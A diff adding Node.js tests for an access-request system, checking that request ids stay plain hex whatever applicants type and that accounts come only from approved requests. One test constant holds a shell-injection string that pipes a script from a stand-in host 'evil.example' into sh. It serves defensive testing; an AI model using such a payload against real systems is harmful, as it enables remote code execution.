@@ -12,9 +12,11 @@ import { execFileSync } from 'node:child_process';
 import { migrate } from '../db/migrate.ts';
 import { closePool, readTxn, serviceTxn } from './db.ts';
 import {
+  approvedRequest,
   decideRequest,
   listRequests,
   NoSuchRequest,
+  NotApproved,
   pendingCount,
   ReasonRequired,
   requestAccess,
@@ -169,4 +171,39 @@ test('pending requests sort ahead of decided ones', async () => {
   await requestAccess('new@x.com', 'New', 'y');
   const rows = await listRequests();
   assert.equal(rows[0]?.status, 'pending', 'what needs deciding is at the top');
+});
+
+// ---- the id is what gets pasted into a shell, so it carries nothing an applicant wrote ----------
+
+const HOSTILE = '" ; curl http://evil.example/x.sh | sh #';
+
+test('a request id is hex and nothing else, whatever the applicant typed', async () => {
+  await requestAccess('mallory@example.com', HOSTILE, HOSTILE);
+  const { id, name } = await first();
+  assert.equal(name, HOSTILE, 'their name is stored exactly as given');
+  // And the id, which is the only part of it that reaches a command line, is not.
+  assert.match(id, /^[0-9a-f]{32}$/);
+});
+
+test('an account is created from an approved request, by id', async () => {
+  await requestAccess('ok@x.com', 'Fine Person', 'reason');
+  const { id } = await first();
+  await decideRequest(id, 'approved', ADMIN, '');
+  assert.deepEqual(await approvedRequest(id), { email: 'ok@x.com', name: 'Fine Person' });
+});
+
+test('knowing a request id is not the same as it having been approved', async () => {
+  // The whole authorisation for an account is a person having approved it. `seed-user --request`
+  // is run by somebody with a shell, so the check has to be here rather than in the screen that
+  // prints the id.
+  await requestAccess('waiting@x.com', 'Waiting', 'reason');
+  const { id } = await first();
+  await assert.rejects(() => approvedRequest(id), NotApproved);
+
+  await decideRequest(id, 'rejected', ADMIN, 'not this time');
+  await assert.rejects(() => approvedRequest(id), NotApproved);
+});
+
+test('an id nobody issued resolves to nothing', async () => {
+  await assert.rejects(() => approvedRequest('0'.repeat(32)), NoSuchRequest);
 });
